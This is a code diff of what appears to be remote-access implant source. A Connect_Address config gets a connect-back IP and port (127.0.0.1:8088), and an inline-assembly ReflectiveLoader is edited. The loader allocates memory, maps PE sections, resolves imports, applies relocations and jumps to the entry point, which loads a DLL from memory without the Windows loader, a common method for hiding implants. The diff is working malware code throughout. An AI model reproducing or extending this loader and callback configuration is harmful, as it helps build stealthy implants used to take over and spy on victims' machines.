@@ -20,7 +20,7 @@ struct Connect_Address
 	char  strIP[MAX_PATH];
 	int   nPort;
 	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
-}g_myAddress = { 0xCC28256,"",0,"" };
+}g_myAddress = { 0xCC28256,"127.0.0.1",8088,"" };
 
 
 char	svcname[MAX_PATH];
@@ -392,9 +392,9 @@ enum LocalEnum
 	exp_AddressOfNames 			= -0x40,
 	AddressOfNameOrdinals		= -0x44,
 	lpflOldProtect				= -0x48,		// VirtualProtect的四个参数 保存老的保护方式
-	var_4c						= -0x4c,
-	var_50						= -0x50,
-	var_54						= -0x54,
+	Signature					= -0x4c,
+	NumberOfSections			= -0x50,
+	IndexOfSections				= -0x54,
 	var_58						= -0x58,
 	var_5c						= -0x5c,
 	var_60						= -0x60,
@@ -403,7 +403,7 @@ enum LocalEnum
 	address						= -0x6c,
 	var_70						= -0x70,
 	EntryPoint					= -0x74,		// 入口点
-	NewMemAddress				= -0x78		// 申请用来展开PE的内存地址
+	NewMemAddress				= -0x78			// 申请用来展开PE的内存地址
 
 };
 
@@ -423,7 +423,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 		jnz		initLocalVar
 
 		call    GetCurrentPositionAddress	// 获取当前位置地址
-		mov		eax, buffer
+		//mov		eax, buffer
 		mov		[ebp + PEAddress], eax		// 保存当前代码所在的地址 PEAddress
 		addressAdd :
 		mov     eax, 1
@@ -718,39 +718,39 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 		mov     edx, [ebp+PEAddress]
 		mov     eax, [ebp+PEAddress]
         add     eax, [edx+3Ch]
-        mov     [ebp+var_4c], eax
+        mov     [ebp+Signature], eax
         push    0x04 						// PAGE_READWRITE 区域不可执行代码，应用程序可以读写该区域
         push    0x3000           			// MEM_COMMIT | MEM_RESERV
-        mov     ecx, [ebp+var_4c]
+        mov     ecx, [ebp+Signature]
         mov     edx, [ecx+0x50]  			// PE signature 0x18 + 0x38  SizeOfImage 映像装入内存后的总大小
         add     edx, 0x3C00000   			// dwSize
         push    edx
         push    0x0
         call    [ebp+ pVirtualAlloc]			// 申请一块 0x3C0000+SizeOfImage大小的内存
         mov     [ebp+NewMemAddress], eax		// NewMemAddress = 申请的内存地址
-        mov     eax, [ebp+var_4c]			// var_4c = signature
+        mov     eax, [ebp+Signature]			// Signature = signature
         mov     ecx, [eax+0x54]				// ecx = SizeOfHeaders 0x18 + 0x3c
         mov     [ebp+varLocalFS30_B], ecx
         mov     edx, [ebp+PEAddress]		// PEAddress = 4D5A address
         mov     [ebp+BaseDllName], edx		// BaseDllName = PEAddress
         mov     eax, [ebp+NewMemAddress]
         mov     [ebp+name_hash], eax		// name_hash = mem_address
-        mov     ecx, [ebp+var_4c]
+        mov     ecx, [ebp+Signature]
         movzx   edx, word ptr [ecx+0x14]	// edx = WORD SizeOfOptionalHeader
-        mov     eax, [ebp+var_4c]
+        mov     eax, [ebp+Signature]
         lea     ecx, [eax+edx+0x18]			// signature + SizeOfOptionalHeader + sizeof signature =  struct _IMAGE_SECTION_HEADER address 区段地址
         mov     [ebp+varLocalFS30_B], ecx			// varLocalFS30_B = 区段地址
-        mov     edx, [ebp+var_4c]
+        mov     edx, [ebp+Signature]
         movzx   eax, word ptr [edx+0x06]	// signature + 0x04 + 0x02
-		mov     [ebp+var_50], eax			// var_50 = NumberOfSections 节的数量
+		mov     [ebp+NumberOfSections], eax			// NumberOfSections = NumberOfSections 节的数量
 		
 			loc_463585:	
-        mov     ecx, [ebp+var_50]
-        mov     [ebp+var_54], ecx			// var_54 = 剩余要处理的Sections数量 index
-        mov     edx, [ebp+var_50]
+        mov     ecx, [ebp+NumberOfSections]
+        mov     [ebp+IndexOfSections], ecx			// IndexOfSections = 剩余要处理的Sections数量 index
+        mov     edx, [ebp+NumberOfSections]
         sub     edx, 1
-        mov     [ebp+var_50], edx
-        cmp     dword ptr[ebp+var_54], 0				// 区段是否都处理了 
+        mov     [ebp+NumberOfSections], edx
+        cmp     dword ptr[ebp+IndexOfSections], 0				// 区段是否都处理了 
         jz      loc_463614
         mov     eax, [ebp+varLocalFS30_B]			// varLocalFS30_B = 区段地址
         mov     ecx, [ebp+NewMemAddress]			// NewMemAddress = mem_address
@@ -803,7 +803,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 			loc_463614: 
 		mov     ecx, 8
 		shl     ecx, 0						//  [1] 数据目录表第二项 导入表 IMAGE_DIRECTORY_ENTRY_IMPORT 
-		mov     edx, [ebp+var_4c]			// var_4c = signature
+		mov     edx, [ebp+Signature]			// Signature = signature
 		lea     eax, [edx+ecx+0x78]			//  0x78 + 0x08
 		mov     [ebp+BaseDllName], eax	
 		mov     ecx, [ebp+BaseDllName]
@@ -906,13 +906,13 @@ loc_46371B:
 		jmp     loc_463631						// 下一个导入表结构
 
 loc_463729:
-		mov     eax, [ebp+var_4c]				// var_4c = signature
+		mov     eax, [ebp+Signature]				// Signature = signature
 		mov     ecx, [ebp+NewMemAddress]				// NewMemAddress = mem_address
 		sub     ecx, [eax+0x34]					// 当前加载基址 - 默认加载基址   meMaddress - ImageBase
 		mov     [ebp+address], ecx
 		mov     edx, 8
 		imul    eax, edx, 5						// 第6个表 重定位表
-		mov     ecx, [ebp+var_4c]
+		mov     ecx, [ebp+Signature]
 		lea     edx, [ecx+eax+0x78]				
 		mov     [ebp+BaseDllName], edx
 		mov     eax, [ebp+BaseDllName]
@@ -1060,7 +1060,7 @@ loc_4638E1:
 
 
 loc_4638F2: 
-		mov     edx, [ebp+var_4c]			// var_4c = signature
+		mov     edx, [ebp+Signature]			// Signature = signature
 		mov     eax, [ebp+NewMemAddress]	// NewMemAddress = mem_address
 		add     eax, [edx+0x28]				// 入口点
 		mov     [ebp+EntryPoint], eax
